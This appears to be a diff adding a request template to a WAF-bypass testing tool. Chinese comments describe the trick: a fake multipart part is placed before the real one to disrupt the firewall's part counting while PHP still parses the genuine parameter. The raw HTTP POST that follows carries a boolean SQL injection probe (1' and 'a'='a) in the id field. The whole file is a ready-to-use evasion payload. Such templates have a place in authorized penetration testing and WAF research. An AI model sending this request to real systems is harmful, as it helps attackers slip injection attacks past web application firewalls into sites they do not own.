@@ -1,0 +1,22 @@
+# @name: multipart构造假part(v1)
+# @tags: post,multipart,fake-part,php,id,bypass
+# @color: gold
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_fake_part_v1
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 构造一个完整假 part(含空行)插在真实参数前，干扰 WAF 的 part 定位与计数；PHP 按 boundary 正确取到真实 id 参数。参考 do9gy multipart Part1 第4条，截图丢失按描述还原。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id"; filename="1.png"
+
+--a
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
